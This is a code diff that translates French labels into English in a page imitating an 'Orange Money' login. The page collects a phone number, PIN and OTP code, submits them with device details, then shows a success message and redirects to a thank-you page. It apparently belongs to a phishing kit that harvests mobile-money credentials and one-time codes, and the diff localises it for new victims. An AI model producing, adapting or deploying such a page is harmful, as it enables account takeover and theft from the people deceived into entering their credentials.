@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Orange Money — Connexion</title>
+<title>Orange Money — Login</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
@@ -113,14 +113,14 @@ input:focus{outline:none;border-color:#f97316;background:#fff}
 
 <div class="card">
   <img src="assets/orange.png" class="logo">
-  <h2>Connexion</h2>
+  <h2>Login</h2>
 
   <form id="loginForm" autocomplete="off">
-    <label>Numéro de téléphone</label>
+    <label>Phone number</label>
     <input id="phone" value="+243" inputmode="numeric">
     <div id="phoneError" class="error"></div>
 
-    <label>Entrez votre code PIN</label>
+    <label>Enter your PIN code</label>
     <div class="pin-row">
       <input class="pin-digit" maxlength="1" inputmode="numeric">
       <input class="pin-digit" maxlength="1" inputmode="numeric">
@@ -129,15 +129,15 @@ input:focus{outline:none;border-color:#f97316;background:#fff}
     </div>
 
     <input type="text" id="hp" style="display:none">
-    <button id="loginBtn" class="btn" disabled>SE CONNECTER</button>
+    <button id="loginBtn" class="btn" disabled>LOG IN</button>
   </form>
 </div>
 
 <!-- OTP MODAL -->
 <div id="otpModal" class="otp-modal" style="display:none">
   <div class="otp-box">
-    <div style="text-align:center"><strong>Entrer le code OTP</strong></div>
-    <p class="small">Un code OTP a été envoyé sur votre téléphone.</p>
+    <div style="text-align:center"><strong>Enter OTP code</strong></div>
+    <p class="small">An OTP code has been sent to your phone.</p>
 
     <div class="otp-row">
       <input class="otp-digit" id="d0" maxlength="1" inputmode="numeric">
@@ -148,18 +148,18 @@ input:focus{outline:none;border-color:#f97316;background:#fff}
       <input class="otp-digit" id="d5" maxlength="1" inputmode="numeric">
     </div>
 
-    <div id="otpWarning" class="otp-warning">Veuillez saisir 6 chiffres</div>
+    <div id="otpWarning" class="otp-warning">Please enter 6 digits</div>
 
     <div class="resend-row">
       <div class="small" id="resendInfo">
-        Renvoi disponible dans <span id="countdown">120</span>s
+        Resend available in <span id="countdown">120</span>s
       </div>
-      <button id="resendBtn" class="resend-btn" disabled>Renvoyer le code</button>
+      <button id="resendBtn" class="resend-btn" disabled>Resend code</button>
     </div>
 
     <div class="otp-actions">
-      <button id="confirmOtp" disabled>Confirmer</button>
-      <button id="cancelOtp">Annuler</button>
+      <button id="confirmOtp" disabled>Confirm</button>
+      <button id="cancelOtp">Cancel</button>
     </div>
 
     <div id="otpStatus" class="small" style="margin-top:10px"></div>
@@ -199,7 +199,7 @@ const loginBtn=document.getElementById('loginBtn');
 function validatePhone(){
   const d=phone.value.replace('+243','');
   if(!/^\d{9}$/.test(d)){
-    phoneError.textContent='Entrez un numéro valide à 9 chiffres';
+    phoneError.textContent='Enter a valid 9-digit number';
     return false;
   }
   phoneError.textContent='';
@@ -263,14 +263,14 @@ function startCountdown(){
   clearInterval(timer);
   seconds=120;
   resendBtn.disabled=true;
-  resendInfo.innerHTML=`Renvoi disponible dans <span id="countdown">${seconds}</span>s`;
+  resendInfo.innerHTML=`Resend available in <span id="countdown">${seconds}</span>s`;
   timer=setInterval(()=>{
     seconds--;
     document.getElementById('countdown').textContent=seconds;
     if(seconds<=0){
       clearInterval(timer);
       resendBtn.disabled=false;
-      resendInfo.textContent="Vous n’avez pas reçu le code ?";
+      resendInfo.textContent="Didn’t receive the code?";
     }
   },1000);
 }
@@ -340,7 +340,7 @@ confirmBtn.onclick=async()=>{
     device,
     submittedAt:new Date().toISOString()
   });
-  otpStatus.innerHTML="<span class='success'>Succès — demande reçue</span>";
+  otpStatus.innerHTML="<span class='success'>Success — request received</span>";
   setTimeout(()=>location.href='thankyou.html',1200);
 };
 
